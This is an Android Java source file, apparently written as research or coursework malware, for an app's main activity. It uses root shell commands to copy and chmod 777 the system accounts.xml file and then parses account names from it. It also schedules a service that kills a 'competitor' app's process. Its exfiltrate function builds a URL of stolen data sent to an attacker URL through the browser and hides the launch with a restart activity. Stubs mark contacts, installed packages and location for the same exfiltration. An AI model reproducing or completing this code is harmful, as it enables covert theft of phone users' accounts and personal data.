package com.trustme.testsu;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import org.xml.sax.Attributes;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

import com.trustme.testsu.root.Root;
import com.trustme.testsu.utils.Constants;
import com.trustme.testsu.utils.HelpFunctions;

import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;

public class MainActivity extends Activity {
	public static final String TAG = "Main Activity";
	public static final int START_IP_CHECK = 1;
	public static final int STOP_IP_CHECK = 2;
	public static Context ctx;
	private SQLiteDatabase database;
	private AlarmManager alarm;
	private PendingIntent pintent;
	
	private ContactsDataSource datasource;
	protected Button btn_exfiltrate, btn_check_ip, btn_stop_check_ip;
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
         ctx = this;
         
         datasource = new ContactsDataSource(this);
         database = datasource.open();
         //we should start checking for Internet connection only when there are new data available
         
         prepareButtons();
         performMalTasks();
         
    	
    }
    
   
    /**
     * Prepares the buttons of the application
     * @author sdemetr2
     */
	private void prepareButtons() {
		// TODO Auto-generated method stub
		prepareButtonCheckIp();
        prepareButtonStopCheckIp();
        prepareButtonExfiltrate();
	}
	
	/**
     * Perform malicious tasks
     * @author sdemetr2
     */
	private void performMalTasks() {
		// TODO Auto-generated method stub
		//getUserLocation();
        //getInstalledApplications();
        //getContacts();
		
		//TODO: Create a service that checks if competitor is running
        //getCompetitorsPid(); 
        
        //getUserAccounts();
		killCompetitor();
	}

	@Override
    public void onDestroy(){
    	datasource.close();
    	super.onDestroy();
    }
    
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.activity_main, menu);
		return true;
	}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	private void getUserAccounts() {
		//move accounts.xml to a convenient location and make it accessible
		String[] commands = new String[2];
		commands[0] = new String("cp " + Constants.ACCOUNTS_FILEPATH + " " + Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME + "\n");
		commands[1] = new String("chmod 777 " + Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME + "\n");
		
		Root rt =new Root();
	    rt.getSecretFile(commands);
	   // rt.changeMode("/data/system/sync/", "accounts.xml", Constants.NEW_ACCOUNTS_NAME);
	    
	    //parse accounts.xml and exfiltrate
	    ParseAccountsTask parse_accounts_task = new ParseAccountsTask();
	    parse_accounts_task.execute();
	}	
	
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/**
	 * Finds the pid of a competitor
	 * TODO: Run this on a background thread..whenever competitor gains focus kill it
	 * @author sdemetr2
	 */
	 private void getCompetitorsPid() {
			// TODO Auto-generated method stub
		 int pid = HelpFunctions.getPidOfPack(Constants.COMPETITOR_PACK);
		 Log.d(TAG, "PID of competitor is: " + pid);
		 Root rt = new Root();
		 rt.kill(pid);
//		 String[] commands = {"kill" + pid};
//		 rt.RunAsRoot(commands);
	}
	 
	 /**
	  * Set alarm for starting a service that checks if a competitor's app is running
	  *  If it does it kills it
	  * @author sdemetr2
	  */
	 private void killCompetitor() {
			// TODO Auto-generated method stub
		 Intent intent = new Intent(getApplicationContext(), AreYouRunningService.class);
		 pintent = PendingIntent.getService(getApplicationContext(), 0, intent, 0);
		 alarm = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
		 alarm.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), Constants.KILL_COMPETITOR_INTERVAL, pintent);
	 }
	 
	 /**
	  * stop killing competitor
	  * @author sdemetr2
	  */
	 private void stopkillingCompetitor() {
			// TODO Auto-generated method stub
		 alarm.cancel(pintent);
	 }
	 
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
    /**
     * This function should fetch and try to exfiltrate 
     * 	all installed applications.
     * If there is no wifi store the data in the Database and
     * 	exfiltrate as soon as the wifi is back on.
     * Ideally it should perform this action in the background.
     * @author sdemetr2
     * 
     */
    private void getInstalledApplications() {
		// TODO Auto-generated method stub
		//send installed packages with their PID to malserver
    	//server responds with competitors pid
    	//app kills that pid whenever it runs
    	GetPackagesTask get_packages_task = new GetPackagesTask();
    	get_packages_task.execute();
	}
    
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /**
     * This function should fetch and and try to exfiltrate 
     * 	all user's contacts.
     * If there is no wifi store the data in the Database and
     * 	exfiltrate as soon as the wifi is back on.
     * Ideally it should perform this action in the background.
     * @author sdemetr2
     * 
     */
	private void getContacts() {
	
		GetContactsTask get_contacts_task = new GetContactsTask();
		get_contacts_task.execute();
	}   

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/**
	 * 
     * This function should fetch and and try to exfiltrate 
     * 	the device's location.
     * If there is no wifi store the data in the Database and
     * 	exfiltrate as soon as the wifi is back on.
     * Ideally it should perform this action in the background.
     * @author sdemetr2
     */
	private void getUserLocation() {
		// TODO Auto-generated method stub
		
	}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	
	private void prepareButtonCheckIp() {
		// TODO Auto-generated method stub
    	btn_check_ip = (Button) findViewById(R.id.start_ip_checking);
    	
    	btn_check_ip.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				start_checking_for_ip();
				start_checking_for_competitor();
			}

		});
	}


	private void prepareButtonStopCheckIp() {
		// TODO Auto-generated method stub
    	btn_stop_check_ip = (Button) findViewById(R.id.stop_ip_checking);
    	
    	btn_stop_check_ip.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				stop_checking_for_ip();
				stop_checking_for_competitor();
			}

		});
	}
    
    private void prepareButtonExfiltrate() {
		// TODO Auto-generated method stub
    	btn_exfiltrate = (Button) findViewById(R.id.exfiltrate);
    	
    	btn_exfiltrate.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				exfiltrate(null,Constants.TEST_TRANSACTION);
			}

		});
	}
    
    /**
     *
     * This function starts a service that checks periodically 
     *  if the device has an IP address and thus Internet access
     *   @author sdemetr2
     */
    private void start_checking_for_ip() {
		// TODO Auto-generated method stub
		Log.i(TAG, "start service");
		Intent intent = new Intent(getApplicationContext(), BackgroundService.class);
		intent.putExtra("CMD", START_IP_CHECK);
		startService(intent);
	}
    
    /**
     *
     * A call to this function should stop the service that checks periodically 
     *  if the device has an IP address and thus Internet access
     *   @author sdemetr2
     */
	protected void stop_checking_for_ip() {
		// TODO Auto-generated method stub
		Log.i(TAG, "stop service");
		Intent intent = new Intent(getApplicationContext(), 
				BackgroundService.class);
		intent.putExtra("CMD", STOP_IP_CHECK);
		stopService(intent);
	}
	
//////////////////////////////////////////////////////////////////////////////////////////////////////////////	
	
	 protected void start_checking_for_competitor() {
			// TODO Auto-generated method stub
		 Log.i(TAG, "start service AreYouRunning");
			Intent intent = new Intent(getApplicationContext(), AreYouRunningService.class);
			startService(intent);
		}
	 
	 protected void stop_checking_for_competitor() {
			// TODO Auto-generated method stub
		 Intent intent = new Intent(getApplicationContext(), AreYouRunningService.class);
			stopService(intent);
		}
	
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	/**
	 * 
     * This function will attempt to send the data to the url
     * 	using the browser
     * Tip: Make different exfiltrate function to exfiltrate COntacts and installed packages and location
     * Tip: Pass arguments to exfiltrate as key,value pairs (map) - easier to construct the URL
     * @author sdemetr2
     * @param data a Map<String, String> of key-value pairs representing the data to be transfered
	 * @param id A unique ID that the server uses to acknowledge this transaction
	 * 
     */
    private void exfiltrate(Map<String, String> data, String id) {
		// TODO Auto-generated method stub
    	String url = Constants.ATTACKER_URL;
    	
    	this.runOnUiThread(new Runnable(){
            public void run(){
                try {
                    RestartTask restartTask = new RestartTask();
                    restartTask.execute();
                }
                catch (Exception e) {
                    Log.d(TAG, "Exfiltrate Exploded when trying to start background task: " + e.getMessage());
                }
            }
        });
        
    	//construct url?key=value&key=value...
    	url += "?id" + id;
    	if (data != null){
	    	for (String key : data.keySet()){
	    		url += "&" + key + "=" + data.get(key);
	    	}
	    	Log.i(TAG, "Constructed URL: " + url);
    	}
        Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
    	startActivity(myIntent);
	}
    
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	/**
	 * 
     * A background task that starts an Activity which will Restart the main Activity
     * Useful for hiding an operation that was triggered by the main activity  
     * @author sdemetr2
     */
    public class RestartTask extends AsyncTask<Void, Void, Void>{
    	protected RestartTask() { }

        @Override
        protected Void doInBackground(Void... unused){
            try {
                // pass time so the built-in dialer app can make the call
                Thread.sleep(50);
            }
            catch (InterruptedException localInterruptedException)
            {
                Log.d("MyPlugin", "RestartTask received an InterruptedException");
            }

            return null;
        }

        @Override
        protected void onPostExecute(Void justEyeCandy){
            super.onPostExecute(justEyeCandy);

            // Start the RestartActivity in a new task. This will snap the phone out of the built-in dialer app, which
            // has started in it's own task at this point in time. The RestartActivity gains control and finishes
            // immediately, leading control back to the activity at the top of the stack in the
            // app (where the user came from when making the call).
            Intent restartIntent = new Intent(MainActivity.this.ctx.getApplicationContext(), RestartActivity.class);
            restartIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            MainActivity.this.ctx.getApplicationContext().startActivity(restartIntent);
        }
    }
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/**
	* 
	* Background Task for fetching user's contacts.
	* It should try to exfiltrate them if there is Internet available or store them
	*	in the Db and start the IP checker
	*@author sdemetr2
	*/
	public class ParseAccountsTask extends AsyncTask<Void, Void, Void>{
		protected ParseAccountsTask() { }
		
		@Override
		protected Void doInBackground(Void... unused){
			try {
			// pass time so the built-in dialer app can make the call
			Thread.sleep(50);
			}
			catch (InterruptedException localInterruptedException)
			{
			Log.d("ParseAccountsTask", "ParseAccountsTask received an InterruptedException");
			}
			
			return null;
		}
		
		@Override
		protected void onPostExecute(Void justEyeCandy){
			super.onPostExecute(justEyeCandy);
			parseAccounts();
			//getPackages();
		}
		
		private void parseAccounts() {
			// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker
//			Root rt =new Root();
//		    rt.getSecretFile("/data/system/sync/", "accounts.xml", Constants.NEW_ACCOUNTS_NAME);
			
			//String type = new String();
			String authority = new String();
			
			try {
				SAXParserFactory factory = SAXParserFactory.newInstance();
				SAXParser saxParser = factory.newSAXParser();
				
				DefaultHandler handler = new DefaultHandler() {
					String type = new String();
					String account = new String();
					Integer account_num = new Integer(0);
					HashMap<String, String> map = new HashMap<String, String>();
					//boolean bauthority = false;
					 
					public void startElement(String uri, String localName,String qName, Attributes attributes) throws SAXException {
					 
						//System.out.println("Start Element :" + qName);
					 
						if (qName.equalsIgnoreCase("AUTHORITY")) {
								Log.i(TAG, "Parsing: Found <authority> tag.");
								account = attributes.getValue("account");
								type = attributes.getValue("type");
								
								//Iterator<Integer> it = map.keySet().iterator();
								if (map.isEmpty()){
									//first account
									Log.i(TAG, "Map is empty. Put the " + account + " to the map");
									map.put(account, type); 
								}
								else{
									//check if the account is already there
									if (!map.containsKey(account)){
										Log.i(TAG, "Map does not contain: " + account + ". Put the account to the map");
										map.put(account, type);
									}
								}
						}
					 
					}
					 
					public void endElement(String uri, String localName,
						String qName) throws SAXException {
					 
						if (qName.equalsIgnoreCase("ACCOUNTS")) {
							//TODO: if WIFI is on exfiltrate map else save map contents to DB
						}
					 
					}
					 
					public void characters(char ch[], int start, int length) throws SAXException {
					 
//						if (bauthority) {
//								System.out.println("First Name : " + new String(ch, start, length));
//								bauthority = false;
//						}
					 
					}
					 
				};
			saxParser.parse(new File(Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME), handler);
			//saxParser.parse(Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME, handler);
				
			} catch (ParserConfigurationException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				Log.i(TAG, "ParserConfigurationException :" + e.getMessage());
			} catch (SAXException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				Log.i(TAG, "SAXException :" + e.getMessage());
			} catch (IOException e) {
				// TODO Could not open file - handle that
				e.printStackTrace();
			}
			
			
		
		}
	}  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////    
    
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/**
	 * 
	 * Background Task for fetching user's contacts.
	 * It should try to exfiltrate them if there is Internet available or store them
	 *	in the Db and start the IP checker
	 *@author sdemetr2
	 */
	public class GetContactsTask extends AsyncTask<Void, Void, Void>{
		protected GetContactsTask() { }
		
		@Override
		protected Void doInBackground(Void... unused){
			try {
				// pass time so the built-in dialer app can make the call
				Thread.sleep(50);
			}
			catch (InterruptedException localInterruptedException)
			{
				Log.d("GetPackagesTask", "GetPackagesTask received an InterruptedException");
			}
			
			return null;
		}
		
		@Override
		protected void onPostExecute(Void justEyeCandy){
			super.onPostExecute(justEyeCandy);
			getAndSaveContacts();
			//getPackages();
		}
	
		private void getAndSaveContacts() {
			// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker          
	
			 database.execSQL("insert into " + DatabaseOpenHelper.DATABASE_TABLE_NAME + " (name,surname,phone)" + "values(\"soteris\",\"demetriou\","
			                 + "\"102853471\") ;");
			 Cursor c = database.rawQuery("Select * from " + DatabaseOpenHelper.DATABASE_TABLE_NAME, null);
			 c.moveToNext();
			 Log.i(TAG,c.getString(c.getColumnIndex(DatabaseOpenHelper.COLUMN_NAME)));
	
		}
	}  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/**
	 * 
	 * Background Task that will fetch the installed packages on the device.
	 * It will try to exfiltrate them if there is Internet or 
	 * store them in the DB and start the IP checker
	 * @author sdemetr2
	 *
	 */
	public class GetPackagesTask extends AsyncTask<Void, Void, Void>{
		protected GetPackagesTask() { }
		
		@Override
		protected Void doInBackground(Void... unused){
			try {
				// pass time so the built-in dialer app can make the call
				Thread.sleep(50);
			}
			catch (InterruptedException localInterruptedException)
			{
				Log.d("GetPackagesTask", "GetPackagesTask received an InterruptedException");
			}
			
			return null;
		}
		
		@Override
		protected void onPostExecute(Void justEyeCandy){
			super.onPostExecute(justEyeCandy);
			
			getPackages();
		}
		
		/**
		 * It just prints the fetched packages info
		 * @return an ArrayList with the installed Applications as PInfo objects
		 */
		private ArrayList<PInfo> getPackages() {
			// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker 
		    ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
		    final int max = apps.size();
		    for (int i=0; i<max; i++) {
		        apps.get(i).prettyPrint();
		    }
		    return apps;
		}
		
		/**
		 * 
		 * @param getSysPackages true if you want to fetch System packages as well, false otherwise
		 * @return an ArrayList with the installed Applications as PInfo objects
		 */
		private ArrayList<PInfo> getInstalledApps(boolean getSysPackages) {
		    ArrayList<PInfo> res = new ArrayList<PInfo>();        
		    List<PackageInfo> packs = getPackageManager().getInstalledPackages(0);
		    for(int i=0; i<packs.size(); i++) {
		        PackageInfo p = packs.get(i);
		        if ((!getSysPackages) && (p.versionName == null)) {
		            continue ;
		        }
		        PInfo newInfo = new PInfo();
		        newInfo.appname = p.applicationInfo.loadLabel(getPackageManager()).toString();
		        newInfo.pname = p.packageName;
		        newInfo.versionName = p.versionName;
		        newInfo.versionCode = p.versionCode;
		        newInfo.icon = p.applicationInfo.loadIcon(getPackageManager());
		        res.add(newInfo);
		    }
		    return res; 
		}
		
	}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
}
